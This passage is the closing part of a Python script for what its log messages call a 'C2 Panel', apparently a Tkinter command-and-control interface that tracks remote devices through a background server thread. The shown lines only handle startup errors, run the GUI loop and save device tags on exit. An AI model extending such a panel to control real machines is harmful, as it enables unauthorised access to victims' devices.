    except Exception as e:
        logger.error(f"Error during GUI startup phase: {e}", exc_info=True)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(f"GUI startup error: {e}", error=True)
        else:
            print(f"GUI startup error: {e}")

    try:
        root.mainloop()
    except KeyboardInterrupt:
        logger.info("C2 Panel shutting down via KeyboardInterrupt.")
    except Exception as e_mainloop:  # Catch errors from mainloop if any (rare)
        logger.error(f"Error in Tkinter mainloop: {e_mainloop}", exc_info=True)
    finally:
        save_device_tags()  # Ensure tags are saved on any exit path
        logger.info(
            "C2 Panel GUI closed. Server thread is a daemon and will exit if main exits."
        )


if __name__ == "__main__":
    main()
